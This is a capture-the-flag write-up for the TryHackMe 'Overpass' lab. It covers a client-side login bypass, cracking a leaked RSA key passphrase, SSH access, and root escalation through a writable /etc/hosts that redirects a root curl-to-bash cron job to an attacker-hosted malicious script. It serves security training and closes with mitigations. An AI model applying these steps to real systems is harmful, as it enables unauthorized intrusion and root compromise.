- Author: Pedro Daniel Gonçalves Antunes
- Date: 28 September 2025
- Room Name: Overpass
- Difficulty: Easy
- Platform: Try Hack Me

# 1. Introduction 

This report documents a Capture The Flag (CTF) exercise against the target `overpass.thm`. The engagement was performed as a single-machine jeopardy-style challenge focused on web and local privilege escalation. The main objective was to enumerate running services, discover and exploit application vulnerabilities to gain user access, and escalate to root to capture the flags.

The testing took place during the CTF session on 2025-09-28. The primary tools used were `nmap` for service discovery, `gobuster` for web directory enumeration, Burp Suite for HTTP interception and manipulation, John the Ripper for password/passphrase cracking, and standard Linux tooling (SSH, curl, python3 simple HTTP server) for exploitation and local enumeration.

____
# 2. Methodology & Tools

**Objective:** discover open services and web endpoints, then investigate any interesting web paths.

**Tools used**

- `nmap` for port/service discovery and basic service detection.

- Web browser to inspect the site and collect contextual information.

- `gobuster` for directory enumeration/discovery of hidden endpoints.

**Commands executed**

- `nmap -sV -sC -A overpass.thm` — full service/version detection with default scripts and OS detection.
    
- `gobuster dir -u http://overpass.thm -w /usr/share/wordlists/dirb/common.txt -t 10` — directory enumeration using a common wordlist (as shown in the screenshot).

____
# 3. Reconnaissance & Findings

## 3.1 Nmap scan

Command: `nmap -sV -sC -A overpass.thm`

**Key results**

- Host is up.
    
- **Open ports** discovered:
    
    - `22/tcp` — `ssh` (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3)
        
    - `80/tcp` — `http` (Golang net/http server — likely a Go-based web service)
        
- Service detection gave the web server title as **Overpass**.

![Nmap](./images/01-nmap.png)


**Notes**

- The presence of SSH means there may be an option to obtain credentials later (e.g., from the web app).
    
- The web server is a Go-based server (this can influence potential vulnerabilities or paths to test).


____
## ## 3.2 Web homepage inspection

I visited `http://overpass.thm` in a browser.

**Observations**

- The homepage is a simple marketing site for a password manager called **Overpass**.
    
- It contains standard static content (about, downloads).
    
- The design suggests there might be an administrative area (typical for a management panel).

![Website](./images/02-website.png)


____

## 3.3 Directory enumeration with Gobuster

Command used (as in screenshot): `gobuster dir -u http://overpass.thm -w /usr/share/wordlists/dirb/common.txt -t 10`

![GoBuster](./images/03-gobuster.png)

**Result highlights**

- `GET /admin` returned a `301` redirect and the `/admin/` endpoint exists.

- Several other typical directories were listed (`/aboutus`, `/css`, `/downloads`, `/img`, `/index.html`).

**Interpretation**

- The `/admin` endpoint is the most interesting discovery from the brute force: it likely hosts an administrator login panel, which could be targeted for authentication bypass, default credentials, or application-level vulnerabilities.

____
## 3.4 Admin page analysis

After discovering the `/admin` endpoint and opening it in the browser, I inspected the page source and client-side JavaScript that handled the login flow. The following steps document how I leveraged a client-side trust flaw to access the admin area, retrieved an encrypted RSA private key, cracked its passphrase offline, and used the key to SSH into the `james` account and retrieve `user.txt`.

![Admin Login Page](./images/04-admin-login.png)

### 3.4.1 Inspecting the login JavaScript

On the admin login page I found a small script that handled authentication. The critical snippet (simplified) was:

![Login.js code bug](./images/05-source-code.png)

**Issue found:** the client sets a cookie named `SessionToken` directly to the server response text unless that response equals `"Incorrect credentials"`. The client trusts the server response blindly — any non-`"Incorrect credentials"` body will be accepted as a valid session token client-side.

### 3.4.2 Intercepting and tampering with the login response

I intercepted the `POST /api/login` request using Burp Suite. The intercepted request body looked like:

```pgsql
username=admin&password=admin
```

The legitimate server response was a short plaintext token (or a status string). I modified/forwarded the intercepted response body so it did **not** contain the exact string `Incorrect credentials` (for example I set it to `Anything`). Because the client accepted any non-`"Incorrect credentials"` response as a session token, the browser set `SessionToken=Anything` and redirected to `/admin`.

> Tools used: Browser, Burp Suite (Intercept → Modify response → Forward).

![Burpsuite](./images/06-burpsuite.png)

### 3.4.3 Accessing the admin area — private key disclosure

With the modified token set in the browser, the `/admin` page loaded and revealed several items of interest:


- A heading indicating the admin user (hinted username: `james`).
    
- An **RSA private key** in PEM format displayed on the page (the PEM block included headers showing it was encrypted: `Proc-Type: 4,ENCRYPTED` and `DEK-Info`).
    

I copied the full PEM block into a file locally named `id_rsa` (preserving the `-----BEGIN RSA PRIVATE KEY-----` and `-----END RSA PRIVATE KEY-----` markers).

![Admin Panel](./images/07-admin-panel.png)

> Note: Exposing private keys in HTML is a severe information leak.


### 3.4.4 Preparing the key for passphrase cracking

The private key was encrypted with a passphrase. To crack it, I converted the PEM to a John-the-Ripper compatible hash using `ssh2john.py` and then ran `john` with a wordlist.

Commands used (examples):

```bash
# prepare the key for john
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt

# crack the passphrase with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# check cracked passphrase
john --show hash.txt
```

`john` successfully recovered the passphrase for the private key.

![ssh2john](./images/08-ssh2john.png)

### 3.4.5 SSH into the target using the recovered key/passphrase

With the `id_rsa` file and recovered passphrase, I connected to the machine as `james`:

```bash
chmod 600 id_rsa
ssh -i id_rsa james@overpass.thm
# when prompted for the passphrase, enter the one recovered by john
```

![SSH Login](./images/09-login-ssh.png)

The SSH session opened and I landed in `james`'s account on the target host. I read the user flag:

![User Flag](./images/10-user-flag.png)

____
## 3.5 Local enumeration & privilege escalation

After obtaining an interactive shell as `james` (see previous sections), I performed local enumeration to find possible paths to privilege escalation.

### Findings

- `/etc/crontab` contained a root cronjob that fetched and executed a build script from the web:

![Cron tab](./images/11-crontab.png)

This means the system (as `root`) periodically downloads and executes a shell script from `http://overpass.thm/downloads/src/buildscript.sh`.

- I discovered that `/etc/hosts` was writable by my user (using enumeration tools like `linpeas`), which allowed name resolution of `overpass.thm` to be controlled locally.

### Exploitation steps

1. **Poison hostname resolution to point `overpass.thm` at my attacker machine.**  
    On the target I edited `/etc/hosts` (since it was writable) and changed the `overpass.thm` entry to my attack machine IP (`10.10.6.4` in my test), so that any process resolving `overpass.thm` would connect to my listener.

![etc hosts](./images/12-etc-hosts.png)

    
2. **Host a malicious `buildscript.sh` on my machine.**  
    On my attacking machine I created the directory and script that the cron would fetch:

```bash
# on attacker machine
mkdir -p downloads/src
cat > downloads/src/buildscript.sh <<'EOF'
#!/bin/bash
# malicious payload executed as root by cron
cat /root/root.txt > /tmp/flag
EOF
chmod +x downloads/src/buildscript.sh
```

3. Start a simple HTTP server to serve the script:

![Python Server](./images/13-python-server.png)

The cron on the victim runs frequently; once it attempted to `curl overpass.thm/downloads/src/buildscript.sh`, DNS resolution pointed it at my machine, and it downloaded and executed my `buildscript.sh` as `root`.

4. **Read the root-owned file produced by the malicious script.**  
After the cronjob executed the script, `/tmp/flag` (or `flag.txt` as you created) contained the root flag. From the `james` shell I read the file:

![Root Flag](./images/14-root-flag.png)

This yielded the root flag and completed privilege escalation.

### Summary of root escalation chain

1. Web admin page → client-side auth bypass → admin view exposed encrypted RSA private key.
    
2. Cracked RSA passphrase offline → SSH into `james`.
    
3. Local enumeration as `james` found writable `/etc/hosts` and a root cron that fetches an external script and pipes it to `bash`.
    
4. Poisoned hostname resolution to point the cron fetch at my attacker host, served a malicious script, cron executed it as root, and the script leaked the root flag.

____
## Conclusion 

The target was fully compromised from web to root. A client-side authentication check allowed easy admin access, the admin page exposed an encrypted private key (with a crackable passphrase), and a root cron job that `curl | bash`'d a remote script allowed final escalation once DNS resolution was controlled. The chain of small mistakes led to full takeover.

---
## Mitigations 

- **Server-side auth:** Do authentication and session issuance/validation only on the server. Never trust client-side checks.
    
- **Protect secrets:** Don’t expose private keys or secrets in web pages. Store them securely.
    
- **Avoid `curl | bash`:** Don’t pipe remote scripts to shell as root — fetch over HTTPS and verify integrity/signatures.
    
- **Fix file permissions:** Make `/etc/hosts` and other system files writable only by root.
    
- **Use strong passphrases:** Require strong/passphrase policies for private keys and rotate keys if exposed.

